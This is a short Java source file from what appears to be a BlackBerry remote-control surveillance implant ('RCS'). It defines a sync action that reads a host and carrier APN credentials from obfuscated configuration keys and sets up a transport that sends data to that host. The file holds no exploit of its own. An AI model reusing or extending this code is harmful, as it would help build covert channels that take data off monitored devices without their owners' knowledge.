//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync;

import blackberry.Messages;
import blackberry.action.Apn;
import blackberry.action.sync.transport.ApnTransport;
import blackberry.config.ChildConf;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class SyncActionApn extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionApn", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    String host;

    private boolean stop;

    public SyncActionApn(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(final ConfAction params) {
        Apn apn;

        try {
            host = params.getString(Messages.getString("d.1")); //$NON-NLS-1$
            stop = params.getBoolean(Messages.getString("d.2")); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.trace("host: " + host); //$NON-NLS-1$
            //#endif

            apn = new Apn();
            ChildConf apnConf = params.getChild(Messages.getString("d.4")); //$NON-NLS-1$

            apn.apn = apnConf.getString(Messages.getString("d.5")); //$NON-NLS-1$
            apn.user = apnConf.getString(Messages.getString("d.6")); //$NON-NLS-1$
            apn.pass = apnConf.getString(Messages.getString("d.7")); //$NON-NLS-1$

            if (apn.isValid()) {
                //#ifdef DEBUG
                debug.trace("adding apn: " + apn); //$NON-NLS-1$
                //#endif

                transports.addElement(new ApnTransport(host, apn));

            } else {
                //#ifdef DEBUG
                debug.trace("No valid apn"); //$NON-NLS-1$
                //#endif
            }

        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error("params FAILED"); //$NON-NLS-1$
            //#endif
            return false;
        }
        return true;
    }

    protected boolean initTransport() {
        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        return "SyncApn "; //$NON-NLS-1$
    }
    //#endif

}
